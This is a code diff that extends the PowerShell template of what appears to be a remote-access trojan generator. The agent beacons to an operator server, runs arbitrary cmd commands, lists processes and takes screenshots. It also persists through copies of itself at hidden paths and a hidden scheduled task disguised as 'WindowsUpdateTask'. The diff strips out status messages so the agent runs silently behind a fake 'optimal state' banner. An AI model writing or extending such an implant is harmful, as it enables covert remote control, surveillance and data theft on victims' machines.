@@ -262,6 +262,7 @@ if __name__ == "__main__":
 AGENT_WINDOWS_PS1_TEMPLATE = '''{CONFIG_BLOCK}
 
 $KEY = $KEY.Replace('-', '+').Replace('_', '/')
+$cwd = (Get-Location).Path
 
 function _enc($d) {
     $r = [System.Convert]::FromBase64String($KEY)
@@ -306,6 +307,14 @@ function _recv($s) {
     return _dec $d
 }
 
+function _exec($s, $cmd) {
+    try {
+        $out = & cmd /c $cmd 2>&1
+        if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
+        _send $s $out
+    } catch { _send $s "[!] $($_.Exception.Message)" }
+}
+
 function _special($s, $cmd) {
     if ($cmd -eq "__ping__") { _send $s "__pong__"; return $true }
     if ($cmd -like "__download__|*") {
@@ -326,16 +335,64 @@ function _special($s, $cmd) {
         } catch { _send $s "__error__|$($_.Exception.Message)" }
         return $true
     }
+    if ($cmd -like "__cd__|*") {
+        $p = $cmd.Substring(6)
+        try {
+            [System.IO.Directory]::SetCurrentDirectory($p)
+            $global:cwd = [System.IO.Directory]::GetCurrentDirectory()
+            _send $s $global:cwd
+        } catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
+    }
     if ($cmd -eq "__selfdestruct__") {
-        $k = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        try { Remove-ItemProperty -Path $k -Name "WindowsUpdate" -ErrorAction SilentlyContinue } catch {}
+        try { Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue } catch {}
         try { Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
         _send $s "__selfdestruct__ok__"
         $s.Close(); $client.Close(); exit
     }
     if ($cmd -eq "__info__") {
-        $i = "$([Environment]::OSVersion.Platform)|$([Environment]::OSVersion.Version.ToString())|$((Get-Location).Path)|$([Environment]::GetFolderPath('UserProfile'))|$([Environment]::UserName)|$([System.Net.Dns]::GetHostName())|$([Guid]::NewGuid().ToString())"
+        $i = "$([Environment]::OSVersion.Platform)|$([Environment]::OSVersion.Version.ToString())|$cwd|$([Environment]::GetFolderPath('UserProfile'))|$([Environment]::UserName)|$([System.Net.Dns]::GetHostName())|$([Guid]::NewGuid().ToString())"
         _send $s $i; return $true
+    }
+    if ($cmd -eq "__ps__") {
+        try { $r = tasklist /v /fo csv 2>&1 | Out-String; _send $s $r }
+        catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
+    }
+    if ($cmd -eq "__screenshot__") {
+        try {
+            Add-Type -AssemblyName System.Drawing
+            $bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+            $g = [System.Drawing.Graphics]::FromImage($bmp)
+            $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
+            $g.Dispose()
+            $ms = New-Object System.IO.MemoryStream
+            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+            $bmp.Dispose()
+            $b64 = [System.Convert]::ToBase64String($ms.ToArray())
+            $ms.Dispose()
+            _send $s $b64
+        } catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
+    }
+    if ($cmd -eq "__spread__") {
+        try {
+            $paths = @()
+            $src = $PSCommandPath
+            $dest1 = "$([Environment]::GetFolderPath('ApplicationData'))\\Microsoft\\Windows\\updater.ps1"
+            Copy-Item $src $dest1 -Force; $paths += $dest1
+            $dest2 = "$([Environment]::GetFolderPath('MyDocuments'))\\~$R.ps1"
+            Copy-Item $src $dest2 -Force -Hidden; $paths += $dest2
+            if (Test-Path "$env:TEMP\\e.ps1") { $dest3 = "$([Environment]::GetFolderPath('ApplicationData'))\\Microsoft\\Windows\\cache.ps1"; Copy-Item "$env:TEMP\\e.ps1" $dest3 -Force; $paths += $dest3 }
+            $taskName = "WindowsUpdateTask"
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest1`""
+            $trigger = New-ScheduledTaskTrigger -Daily -At 3am -RepetitionInterval (New-TimeSpan -Hours 1)
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+            $pathsStr = $paths -join "|"
+            _send $s "__ok__|$($pathsStr)"
+        } catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
     }
     return $false
 }
@@ -364,33 +421,23 @@ Write-Host " System is running in optimal state." -ForegroundColor Green
 Write-Host ""
 
 while ($true) {
-    Write-Host " [*] Network connectivity check..." -ForegroundColor Yellow
     try {
         $client = New-Object System.Net.Sockets.TcpClient
         $client.ReceiveTimeout = 60000; $client.SendTimeout = 30000
-        Write-Host " [*] Connecting..." -ForegroundColor DarkGray
         $client.Connect($IP, $PORT)
-        Write-Host " [+] Connected to update server." -ForegroundColor Green
         $s = $client.GetStream()
         try {
-            Write-Host " [*] Sending beacon..." -ForegroundColor DarkGray
             _send $s "beacon"
-            Write-Host " [*] Beacon sent, waiting for commands..." -ForegroundColor DarkGray
             while ($true) {
                 $cmd = _recv $s
-                if ($cmd -eq $null) { Write-Host " [*] Connection closed by server" -ForegroundColor DarkGray; break }
-                Write-Host " [+] Command received" -ForegroundColor DarkGray
+                if ($cmd -eq $null) { break }
                 if (_special $s $cmd) { continue }
-                try {
-                    $out = & cmd /c $cmd 2>&1
-                    if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
-                    _send $s $out
-                } catch { _send $s "[!] $($_.Exception.Message)" }
+                _exec $s "cd /d `"$cwd`" && $cmd"
             }
-        } catch { Write-Host " [!] Stream error: $_" -ForegroundColor Red }
-        $s.Close(); $client.Close()
-    } catch { Write-Host " [!] Connection error: $_" -ForegroundColor Red }
-    Write-Host " [-] Connection lost. Retrying in 30s..." -ForegroundColor DarkYellow
+        } catch {}
+        try { $s.Close() } catch {}
+        try { $client.Close() } catch {}
+    } catch {}
     Start-Sleep -Seconds 30
 }'''
 
